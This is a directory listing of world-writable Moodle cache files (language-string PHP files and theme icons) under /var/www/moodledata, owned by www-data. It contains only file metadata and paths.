    -rw-rw-rw- 1 www-data www-data 815 Apr 23  2018 /var/www/moodledata/cache/lang/en/repository_upload.php
    -rw-rw-rw- 1 www-data www-data 911 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_radius.php
    -rw-rw-rw- 1 www-data www-data 15470 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_glossary.php
    -rw-rw-rw- 1 www-data www-data 568 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_adaptive.php
    -rw-rw-rw- 1 www-data www-data 198 Feb  3 11:17 /var/www/moodledata/cache/lang/en/gradeexport_ods.php
    -rw-rw-rw- 1 www-data www-data 298 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_cohort.php
    -rw-rw-rw- 1 www-data www-data 173 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_immediatecbm.php
    -rw-rw-rw- 1 www-data www-data 5013 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_editor.php
    -rw-rw-rw- 1 www-data www-data 3936 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_uploaduser.php
    -rw-rw-rw- 1 www-data www-data 834 Apr 23  2018 /var/www/moodledata/cache/lang/en/workshopform_numerrors.php
    -rw-rw-rw- 1 www-data www-data 101096 Apr 23  2018 /var/www/moodledata/cache/lang/en/core.php
    -rw-rw-rw- 1 www-data www-data 2336 Apr 23  2018 /var/www/moodledata/cache/lang/en/workshopallocation_random.php
    -rw-rw-rw- 1 www-data www-data 140 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_settings.php
    -rw-rw-rw- 1 www-data www-data 859 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_pop3.php
    -rw-rw-rw- 1 www-data www-data 11734 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_security.php
    -rw-rw-rw- 1 www-data www-data 298 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_participation.php
    -rw-rw-rw- 1 www-data www-data 140 Feb  3 11:17 /var/www/moodledata/cache/lang/en/qbehaviour_informationitem.php
    -rw-rw-rw- 1 www-data www-data 615 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_dbtransfer.php
    -rw-rw-rw- 1 www-data www-data 172 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_loglive.php
    -rw-rw-rw- 1 www-data www-data 8882 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_ldap.php
    -rw-rw-rw- 1 www-data www-data 184 Feb  3 11:17 /var/www/moodledata/cache/lang/en/gradeexport_xls.php
    -rw-rw-rw- 1 www-data www-data 350 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_completionstatus.php
    -rw-rw-rw- 1 www-data www-data 574 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_plagiarism.php
    -rw-rw-rw- 1 www-data www-data 905 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_truefalse.php
    -rw-rw-rw- 1 www-data www-data 265 Apr 23  2018 /var/www/moodledata/cache/lang/en/workshopform_comments.php
    -rw-rw-rw- 1 www-data www-data 339 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_label.php
    -rw-rw-rw- 1 www-data www-data 119 Apr 23  2018 /var/www/moodledata/cache/lang/en/format_social.php
    -rw-rw-rw- 1 www-data www-data 289 Apr 23  2018 /var/www/moodledata/cache/lang/en/format_topics.php
    -rw-rw-rw- 1 www-data www-data 266 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_nologin.php
    -rw-rw-rw- 1 www-data www-data 110 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_activitynames.php
    -rw-rw-rw- 1 www-data www-data 727 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_navigation.php
    -rw-rw-rw- 1 www-data www-data 304 Feb  3 11:17 /var/www/moodledata/cache/lang/en/qbehaviour_missing.php
    -rw-rw-rw- 1 www-data www-data 1952 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_form.php
    -rw-rw-rw- 1 www-data www-data 113 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_tex.php
    -rw-rw-rw- 1 www-data www-data 20842 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_role.php
    -rw-rw-rw- 1 www-data www-data 2347 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_customlang.php
    -rw-rw-rw- 1 www-data www-data 28725 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_question.php
    -rw-rw-rw- 1 www-data www-data 284 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_mentees.php
    -rw-rw-rw- 1 www-data www-data 402 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_urltolink.php
    -rw-rw-rw- 1 www-data www-data 94 Feb  3 11:17 /var/www/moodledata/cache/lang/en/message_popup.php
    -rw-rw-rw- 1 www-data www-data 25157 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_lesson.php
    -rw-rw-rw- 1 www-data www-data 15714 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_webservice.php
    -rw-rw-rw- 1 www-data www-data 4966 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_shibboleth.php
    -rw-rw-rw- 1 www-data www-data 181 Feb  3 11:17 /var/www/moodledata/cache/lang/en/gradeexport_txt.php
    -rw-rw-rw- 1 www-data www-data 554 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_pam.php
    -rw-rw-rw- 1 www-data www-data 2125 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_calculatedsimple.php
    -rw-rw-rw- 1 www-data www-data 2447 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_nimble.php
    -rw-rw-rw- 1 www-data www-data 36713 Apr 23  2018 /var/www/moodledata/cache/lang/en/editor_tinymce.php
    -rw-rw-rw- 1 www-data www-data 8341 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_group.php
    -rw-rw-rw- 1 www-data www-data 1875 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_mnet.php
    -rw-rw-rw- 1 www-data www-data 6829 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_calendar.php
    -rw-rw-rw- 1 www-data www-data 4512 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_resource.php
    -rw-rw-rw- 1 www-data www-data 19224 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_scorm.php
    -rw-rw-rw- 1 www-data www-data 240 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_html.php
    -rw-rw-rw- 1 www-data www-data 13441 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_xmldb.php
    -rw-rw-rw- 1 www-data www-data 2554 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_mediaplugin.php
    -rw-rw-rw- 1 www-data www-data 479 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_mnet_hosts.php
    -rw-rw-rw- 1 www-data www-data 275 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_emoticon.php
    -rw-rw-rw- 1 www-data www-data 1664 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_flatfile.php
    -rw-rw-rw- 1 www-data www-data 83 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_tidy.php
    -rw-rw-rw- 1 www-data www-data 2325 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_overlay.php
    -rw-rw-rw- 1 www-data www-data 340 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_health.php
    -rw-rw-rw- 1 www-data www-data 523 Apr 23  2018 /var/www/moodledata/cache/lang/en/gradereport_grader.php
    -rw-rw-rw- 1 www-data www-data 1009 Apr 23  2018 /var/www/moodledata/cache/lang/en/workshopform_accumulative.php
    -rw-rw-rw- 1 www-data www-data 1416 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_glossary_random.php
    -rw-rw-rw- 1 www-data www-data 136 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_search_forums.php
    -rw-rw-rw- 1 www-data www-data 520 Apr 23  2018 /var/www/moodledata/cache/lang/en/workshopform_rubric.php
    -rw-rw-rw- 1 www-data www-data 1520 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_shortanswer.php
    -rw-rw-rw- 1 www-data www-data 40140 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_grades.php
    -rw-rw-rw- 1 www-data www-data 386 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_online_users.php
    -rw-rw-rw- 1 www-data www-data 231 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_feedback.php
    -rw-rw-rw- 1 www-data www-data 91 Apr 25  2018 /var/www/moodledata/cache/lang/en/tool_innodb.php
    -rw-rw-rw- 1 www-data www-data 948 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_calculatedmulti.php
    -rw-rw-rw- 1 www-data www-data 18628 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_mnet.php
    -rw-rw-rw- 1 www-data www-data 358 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_none.php
    -rw-rw-rw- 1 www-data www-data 119 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_adaptivenopenalty.php
    -rw-rw-rw- 1 www-data www-data 3769 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_db.php
    -rw-rw-rw- 1 www-data www-data 2567 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_arialist.php
    -rw-rw-rw- 1 www-data www-data 17439 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_workshop.php
    -rw-rw-rw- 1 www-data www-data 825 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_imscp.php
    -rw-rw-rw- 1 www-data www-data 404 Apr 23  2018 /var/www/moodledata/cache/lang/en/repository_recent.php
    -rw-rw-rw- 1 www-data www-data 85 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_messages.php
    -rw-rw-rw- 1 www-data www-data 2403 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_paypal.php
    -rw-rw-rw- 1 www-data www-data 1283 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_randomsamatch.php
    -rw-rw-rw- 1 www-data www-data 2416 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_nonzero.php
    -rw-rw-rw- 1 www-data www-data 107 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_deferredfeedback.php
    -rw-rw-rw- 1 www-data www-data 2794 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_tag.php
    -rw-rw-rw- 1 www-data www-data 3909 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_unittest.php
    -rw-rw-rw- 1 www-data www-data 6480 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_message.php
    -rw-rw-rw- 1 www-data www-data 152 Feb  3 11:17 /var/www/moodledata/cache/lang/en/qbehaviour_interactivecountback.php
    -rw-rw-rw- 1 www-data www-data 4465 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_self.php
    -rw-rw-rw- 1 www-data www-data 978 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_essay.php
    -rw-rw-rw- 1 www-data www-data 283 Apr 23  2018 /var/www/moodledata/cache/lang/en/format_weeks.php
    -rw-rw-rw- 1 www-data www-data 95 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_data.php
    -rw-rw-rw- 1 www-data www-data 621 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_timezoneimport.php
    -rw-rw-rw- 1 www-data www-data 101 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_manualgraded.php
    -rw-rw-rw- 1 www-data www-data 704 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_questioninstances.php
    -rw-rw-rw- 1 www-data www-data 5483 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_qeupgradehelper.php
    -rw-rw-rw- 1 www-data www-data 248 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_manual.php
    -rw-rw-rw- 1 www-data www-data 145 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_course_summary.php
    -rw-rw-rw- 1 www-data www-data 48789 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_quiz.php
    -rw-rw-rw- 1 www-data www-data 105804 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_admin.php
    -rw-rw-rw- 1 www-data www-data 12550 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_backup.php
    -rw-rw-rw- 1 www-data www-data 282 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_censor.php
    -rw-rw-rw- 1 www-data www-data 310 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_stats.php
    -rw-rw-rw- 1 www-data www-data 11600 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_ldap.php
    -rw-rw-rw- 1 www-data www-data 147 Apr 23  2018 /var/www/moodledata/cache/lang/en/gradereport_overview.php
    -rw-rw-rw- 1 www-data www-data 208 Apr 25  2018 /var/www/moodledata/cache/lang/en/quizaccess_securewindow.php
    -rw-rw-rw- 1 www-data www-data 924 Feb  3 11:17 /var/www/moodledata/cache/lang/en/qtype_missingtype.php
    -rw-rw-rw- 1 www-data www-data 95 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_activity_modules.php
    -rw-rw-rw- 1 www-data www-data 575 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_nntp.php
    -rw-rw-rw- 1 www-data www-data 2383 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_fusion.php
    -rw-rw-rw- 1 www-data www-data 98 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_emailprotect.php
    -rw-rw-rw- 1 www-data www-data 99 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_course_overview.php
    -rw-rw-rw- 1 www-data www-data 87 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_blog_menu.php
    -rw-rw-rw- 1 www-data www-data 1569 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_match.php
    -rw-rw-rw- 1 www-data www-data 909 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_section_links.php
    -rw-rw-rw- 1 www-data www-data 100 Apr 25  2018 /var/www/moodledata/cache/lang/en/tool_generator.php
    -rw-rw-rw- 1 www-data www-data 87 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_participants.php
    -rw-rw-rw- 1 www-data www-data 157 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_courseoverview.php
    -rw-rw-rw- 1 www-data www-data 627 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_tag_flickr.php
    -rw-rw-rw- 1 www-data www-data 16956 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_data.php
    -rw-rw-rw- 1 www-data www-data 3963 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_condition.php
    -rw-rw-rw- 1 www-data www-data 90 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_news_items.php
    -rw-rw-rw- 1 www-data www-data 12500 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_assignment.php
    -rw-rw-rw- 1 www-data www-data 2846 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_tags.php
    -rw-rw-rw- 1 www-data www-data 14179 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_survey.php
    -rw-rw-rw- 1 www-data www-data 99 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_recent_activity.php
    -rw-rw-rw- 1 www-data www-data 1920 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_mnet.php
    -rw-rw-rw- 1 www-data www-data 103 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_social_activities.php
    -rw-rw-rw- 1 www-data www-data 9192 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_completion.php
    -rw-rw-rw- 1 www-data www-data 92 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_site_main_menu.php
    -rw-rw-rw- 1 www-data www-data 5138 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_numerical.php
    -rw-rw-rw- 1 www-data www-data 138 Feb  3 11:17 /var/www/moodledata/cache/lang/en/webservice_xmlrpc.php
    -rw-rw-rw- 1 www-data www-data 93 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_algebra.php
    -rw-rw-rw- 1 www-data www-data 91 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_backups.php
    -rw-rw-rw- 1 www-data www-data 1567 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_langimport.php
    -rw-rw-rw- 1 www-data www-data 1367 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_mymobile.php
    -rw-rw-rw- 1 www-data www-data 374 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_category.php
    -rw-rw-rw- 1 www-data www-data 427 Apr 23  2018 /var/www/moodledata/cache/lang/en/repository_local.php
    -rw-rw-rw- 1 www-data www-data 26226 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_forum.php
    -rw-rw-rw- 1 www-data www-data 446 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_multilangupgrade.php
    -rw-rw-rw- 1 www-data www-data 1650 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_notes.php
    -rw-rw-rw- 1 www-data www-data 101 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_multilang.php
    -rw-rw-rw- 1 www-data www-data 87 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_blog_tags.php
    -rw-rw-rw- 1 www-data www-data 711 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_capability.php
    -rw-rw-rw- 1 www-data www-data 292 Feb  3 11:17 /var/www/moodledata/cache/lang/en/gradeexport_xml.php
    -rw-rw-rw- 1 www-data www-data 5871 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_imsenterprise.php
    -rw-rw-rw- 1 www-data www-data 1576 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_cohort.php
    -rw-rw-rw- 1 www-data www-data 606 Apr 24  2018 /var/www/moodledata/cache/lang/en/core_my.php
    -rw-rw-rw- 1 www-data www-data 780 Feb  3 11:17 /var/www/moodledata/cache/lang/en/qtype_random.php
    -rw-rw-rw- 1 www-data www-data 2575 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_afterburner.php
    -rw-rw-rw- 1 www-data www-data 365 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_unsuproles.php
    -rw-rw-rw- 1 www-data www-data 115 Apr 23  2018 /var/www/moodledata/cache/lang/en/format_scorm.php
    -rw-rw-rw- 1 www-data www-data 821 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_tag_youtube.php
    -rw-rw-rw- 1 www-data www-data 1076 Apr 23  2018 /var/www/moodledata/cache/lang/en/mnetservice_enrol.php
    -rw-rw-rw- 1 www-data www-data 785 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_description.php
    -rw-rw-rw- 1 www-data www-data 303 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_log.php
    -rw-rw-rw- 1 www-data www-data 1030 Apr 25  2018 /var/www/moodledata/cache/lang/en/tool_profiling.php
    -rw-rw-rw- 1 www-data www-data 2749 Apr 24  2018 /var/www/moodledata/cache/lang/en/core_filters.php
    -rw-rw-rw- 1 www-data www-data 137 Apr 23  2018 /var/www/moodledata/cache/lang/en/gradereport_user.php
    -rw-rw-rw- 1 www-data www-data 266 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_configlog.php
    -rw-rw-rw- 1 www-data www-data 275 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_blog_recent.php
    -rw-rw-rw- 1 www-data www-data 38242 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_error.php
    -rw-rw-rw- 1 www-data www-data 2674 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_manual.php
    -rw-rw-rw- 1 www-data www-data 99 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_admin_bookmarks.php
    -rw-rw-rw- 1 www-data www-data 25466 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_lti.php
    -rw-rw-rw- 1 www-data www-data 691 Apr 23  2018 /var/www/moodledata/cache/lang/en/workshopeval_best.php
    -rw-rw-rw- 1 www-data www-data 128 Feb  3 11:17 /var/www/moodledata/cache/lang/en/webservice_soap.php
    -rw-rw-rw- 1 www-data www-data 3567 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_database.php
    -rw-rw-rw- 1 www-data www-data 1465 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_bloglevelupgrade.php
    -rw-rw-rw- 1 www-data www-data 744 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_imap.php
    -rw-rw-rw- 1 www-data www-data 91 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_calendar_month.php
    -rw-rw-rw- 1 www-data www-data 0 Apr 23  2018 /var/www/moodledata/cache/theme/standard/javascript_head.js
    -rw-rw-rw- 1 www-data www-data 152 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_randomsamatch/icon.gif
    -rw-rw-rw- 1 www-data www-data 78 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_numerical/icon.gif
    -rw-rw-rw- 1 www-data www-data 68 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_shortanswer/icon.gif
    -rw-rw-rw- 1 www-data www-data 84 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multianswer/icon.gif
    -rw-rw-rw- 1 www-data www-data 637 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_user/icon.png
    -rw-rw-rw- 1 www-data www-data 149 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_match/icon.gif
    -rw-rw-rw- 1 www-data www-data 85 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/return.gif
    -rw-rw-rw- 1 www-data www-data 1720 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/loading_small.gif
    -rw-rw-rw- 1 www-data www-data 6715 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/loading.gif
    -rw-rw-rw- 1 www-data www-data 126 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/users.gif
    -rw-rw-rw- 1 www-data www-data 115 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/group.gif
    -rw-rw-rw- 1 www-data www-data 79 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/info.gif
    -rw-rw-rw- 1 www-data www-data 134 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/permissions.gif
    -rw-rw-rw- 1 www-data www-data 99 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/settings.gif
    -rw-rw-rw- 1 www-data www-data 157 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/hide.gif
    -rw-rw-rw- 1 www-data www-data 75 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/one.gif
    -rw-rw-rw- 1 www-data www-data 118 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/backup.gif
    -rw-rw-rw- 1 www-data www-data 135 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/withsubcat.png
    -rw-rw-rw- 1 www-data www-data 940 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/publish.png
    -rw-rw-rw- 1 www-data www-data 132 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/cohort.gif
    -rw-rw-rw- 1 www-data www-data 333 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/cross_red_big.gif
    -rw-rw-rw- 1 www-data www-data 91 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/all.gif
    -rw-rw-rw- 1 www-data www-data 104 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/edit.gif
    -rw-rw-rw- 1 www-data www-data 117 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/restore.gif
    -rw-rw-rw- 1 www-data www-data 139 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/roles.gif
    -rw-rw-rw- 1 www-data www-data 210 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/navigationitem.png
    -rw-rw-rw- 1 www-data www-data 116 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/menu.gif
    -rw-rw-rw- 1 www-data www-data 140 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/move_2d.gif
    -rw-rw-rw- 1 www-data www-data 170 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/checkpermissions.gif
    -rw-rw-rw- 1 www-data www-data 99 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/report.gif
    -rw-rw-rw- 1 www-data www-data 95 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/course.gif
    -rw-rw-rw- 1 www-data www-data 96 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i/grades.gif
    -rw-rw-rw- 1 www-data www-data 118 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/req.gif
    -rw-rw-rw- 1 www-data www-data 2617 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/moodlelogo.gif
    -rw-rw-rw- 1 www-data www-data 2578 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/u/f1.png
    -rw-rw-rw- 1 www-data www-data 1557 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/u/f2.png
    -rw-rw-rw- 1 www-data www-data 43 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/spacer.gif
    -rw-rw-rw- 1 www-data www-data 1012 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/a/refresh.png
    -rw-rw-rw- 1 www-data www-data 108 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/move.gif
    -rw-rw-rw- 1 www-data www-data 238 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/dock_to_block.png
    -rw-rw-rw- 1 www-data www-data 176 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/copy.gif
    -rw-rw-rw- 1 www-data www-data 61 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/right.gif
    -rw-rw-rw- 1 www-data www-data 484 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/addgreen.gif
    -rw-rw-rw- 1 www-data www-data 76 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/groupn.gif
    -rw-rw-rw- 1 www-data www-data 236 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/block_to_dock.png
    -rw-rw-rw- 1 www-data www-data 130 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/expanded.png
    -rw-rw-rw- 1 www-data www-data 65 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/delete.gif
    -rw-rw-rw- 1 www-data www-data 80 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/hide.gif
    -rw-rw-rw- 1 www-data www-data 133 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/collapsed.png
    -rw-rw-rw- 1 www-data www-data 917 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/block.gif
    -rw-rw-rw- 1 www-data www-data 64 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/up.gif
    -rw-rw-rw- 1 www-data www-data 124 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/switch_plus.gif
    -rw-rw-rw- 1 www-data www-data 61 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/left.gif
    -rw-rw-rw- 1 www-data www-data 94 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/backup.gif
    -rw-rw-rw- 1 www-data www-data 93 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/edit.gif
    -rw-rw-rw- 1 www-data www-data 94 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/restore.gif
    -rw-rw-rw- 1 www-data www-data 188 Feb  3 10:57 /var/www/moodledata/cache/theme/standard/pix/moodle/t/collapsed_empty.png
    -rw-rw-rw- 1 www-data www-data 64 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/down.gif
    -rw-rw-rw- 1 www-data www-data 61 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/log.gif
    -rw-rw-rw- 1 www-data www-data 119 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/t/switch_minus.gif
    -rw-rw-rw- 1 www-data www-data 192 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/help.gif
    -rw-rw-rw- 1 www-data www-data 118 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/adv.gif
    -rw-rw-rw- 1 www-data www-data 176 Apr 23  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/docs.gif
    -rw-rw-rw- 1 www-data www-data 97 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/f/text.gif
    -rw-rw-rw- 1 www-data www-data 159 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/f/folder.gif
    -rw-rw-rw- 1 www-data www-data 190 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_truefalse/icon.gif
    -rw-rw-rw- 1 www-data www-data 1971 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_upload/icon.png
    -rw-rw-rw- 1 www-data www-data 896 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedsimple/icon.gif
    -rw-rw-rw- 1 www-data www-data 104 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_essay/icon.gif
